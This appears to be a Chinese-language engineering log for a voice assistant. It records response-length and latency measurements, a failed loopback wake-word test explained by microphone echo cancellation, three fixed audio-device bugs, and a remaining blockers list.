| 「帮我改一下这个函数」 | 130 字 / 整轮 **47766 ms** | 15 字 / 整轮 **19827 ms** |

这把音色约 4.3 字/秒，所以 120 字要念 **28 秒**，而 LLM 首字 5.0 s、TTS 首块 2.4 s ——
等待里 20 秒以上是在念一段没人需要那么长的回答。两条路各缺一句话：

- HTTP 那条路的 system prompt 只写了「通常两三句话说完」，模型把它读成「两三句 + 一段
  补充」。改成可数的上限（40 字 / 两句）+ 明确禁令（不许空行分段、不复述问题、
  结尾不加「有什么想问的」）。
- **CLI 那条路根本没有任何提示** —— `cli.py` 只发 `render_prompt(task)`。它是本机进程，
  操作系统和工作目录自己知道，但「回答会被念出来」猜不到。

### 第一声（目标指标）

| 这一句 | 走谁 | 第一声 | 整轮 |
|---|---|---|---|
| 你好，简单介绍一下你自己 | relay（http） | **11280 ms** | 19358 ms |
| 帮我改一下这个函数 | claude（cli） | 43125 ms | 55391 ms |

普通对话那 11.3 秒的构成是 **LLM 整轮 + TTS 首块 2.4 s** —— 这个端点首字 = 整轮，所以
缩短回答同时缩短了第一声。claude 那 43 秒是 CLI 自己的启动 + 工作区扫描。

### 两个附带发现

- **`claude` 读到了 Vox 仓库的 git status**：回答里点名了当时正在改的 `cli.py` 与
  `environment.py`。`cwd = ".agent-workspace"` 在仓库**内部**，而 git 会往上找仓库根 ——
  隔离不完整。已记为已知缺口。
- **蓝牙耳机不在时没有可用麦克风**：`input.device = "耳机"` 匹配不上（当时只枚举到
  `麦克风阵列 (Realtek)` 与 ToDesk 虚拟设备），而那只阵列实测峰值 0.00003。此时
  `open_voice_stack` 会给一条可读的警告，死麦克风检测 4 秒后进运行日志 —— 行为正确，
  但**这台机器在耳机断开时唤醒功能整体不可用**，这是环境事实不是缺陷。


## 想不用人也量到「过空气」的唤醒率：失败了，以及为什么（2026-09-01，REAL-MIC(loopback)）

所有唤醒率数字此前都是 **SIM**（wav 直接喂回调）。试图用「扬声器放真录音、麦克风收」补上
空气那一段 —— 空气是真的，说话人不是活的，等级记作 **REAL-MIC(loopback)**，不冒充真人。

**结论：这台机器上这条路不成立**，三个具体原因，每个都量到了：

1. **蓝牙耳机不能同时当扬声器和麦克风。** Windows 在 A2DP（立体声输出、无麦克风）与
   HFP（单声道 + 麦克风）之间切换。实测：临时开的 `InputStream` 收到峰值 0.1696，而
   播放一开始，生产装配那条流收到 **112 块全零** —— 流照常开着、回调照常触发。
2. **能用的输入设备只有一只，而且它在两次枚举之间会变。** 只有耳机稳定接受 16 kHz 单声道；
   Realtek 阵列在 WASAPI 下只接受 2 通道，在 MME 下可以。索引每次枚举都可能不同。
3. **「Realtek 扬声器 → Realtek 阵列」这条无蓝牙的路通了，但唤醒词不命中**：生产装配收到
   `speech_blocks 15`、包络 0.0202、增益爬到 2.376 —— 也就是说 VAD 和增益都在正常工作，
   只是 KWS 不命中。把播放增益提到 3.0 反而更差（麦克风峰值 0.1209 → 0.0569，播放侧被
   `np.clip` 削平了）。

**不能从第 3 条推出「过空气就唤不醒」。** 一只笔记本扬声器播放的人声录音，和一个人在说话，
不是同一个声学对象（频响、指向性、近讲效应全都不同）。正确的结论是**这个装置不能替代
一个人说话**，所以 REAL-MIC 那一格仍然空着。

### 顺带查出并修掉的三个真缺陷

| 缺陷 | 症状 | 修法 |
|---|---|---|
| `_match_device` 并列时返回名字片段 | 蓝牙耳机与一只蓝牙音箱的名字都含「耳机」，于是 PortAudio 抛 `Multiple input devices found`，麦克风整体开不起来 | 先按「能否按这个采样率打开」过滤，再按 host API 排序，还并列取最小索引。设备选择不是安全边界 |
| WDM-KS 被当成最后的退路 | `check_input_settings` 说格式没问题，`start()` 抛 `Unanticipated host error`（输出 GLE 0x490 / 输入 GLE 0x48F） | 按名字选设备时**直接排除** WDM-KS；写索引那条路不变 |
| 名字解析不到时把名字原样交给 PortAudio | 抛出的报错列举的恰恰是刚被判定「开不起来」的那两条 WDM-KS 条目 —— 最容易把人带错方向的失败 | 退到系统默认设备并给一条可读警告；默认设备聋的话由「全零输入」探测在 4 秒后进日志 |

### 真机验收的入口已经建好

`scripts/acceptance/real_mic_e2e.py`：跑起来、按提示说 N 轮、读最后那张表。它在生产装配上
插了六个时刻（KWS 命中 / 声纹判定 / ASR 端点 / 派发 / agent 首 chunk / 第一声），直接输出
目标指标那一列。**这一步没有替代品** —— 需要一个人说话，和一只不聋的麦克风。


### 回环失败的原因：不是唤醒词，是阵列麦克风自己的回声消除

上面第 3 条（空气通了但 KWS 不命中）不能就这么留着 —— 它读起来像「过空气就唤不醒」，
而那会是个严重结论。用软件模拟每一项空气退化，逐项加进同一段真录音，喂**生产那条回调
路径**（`.vox-ref/degrade_probe.py`，无硬件、无副作用）：

| 退化 | 命中 | 增益末值 | VAD 语音块 |
|---|---|---|---|
| 原样（峰值 0.746） | **3/3** | 0.74 | 36 |
| 只缩到 0.05 | **3/3** | 2.79 | 34 |
| 带通 300–7000 Hz（像小扬声器） | **3/3** | 2.71 | 34 |
| 五阶衰减混响（像房间） | **3/3** | 2.80 | 34 |
| 带通 + 混响 | **3/3** | 2.63 | 34 |
| 带通 + 混响 + 底噪 | **3/3** | 2.67 | 35 |

**这个 KWS 对通道响应、混响和底噪都稳。** 所以回环那次失败另有原因，两个数字指向同一个
解释：临时开的裸 `InputStream` 在播放时收到峰值 **0.1209**，而紧接着生产装配那条流的包络
只有 **0.0202**、VAD 语音块 **15**（SIM 同一段是 34–36）。

**推断（不是实测）：那只「麦克风阵列」的驱动端点自带回声消除（AEC）。** 它的工作恰恰是
消掉扬声器正在放的东西，而 AEC 需要几秒收敛 —— 3 秒的听力测试里它还没锁上（信号过得去），
生产那条流跑得久，锁上之后剩下的就是残差。这解释了两个数字为什么同时成立。

结论因此更强也更窄：**扬声器 → 内建阵列这条回环在原理上就测不了唤醒**（AEC 会消掉素材），
而唤醒词本身在可模拟的空气退化下是稳的。要过空气测，麦克风必须是不对笔记本扬声器做 AEC 的
那一只（耳机麦），而它此刻断开着。**真人说话仍然是唯一的 REAL-MIC 判据。**


## Blockers

1. Build a separate-window visual spike before copying audio components.
2. Define and verify the live EvoX session bridge.

License note (2026-07-26): the user confirmed VoxCord is their own independent project, so the distribution-license blocker is resolved and selective reuse is permitted.
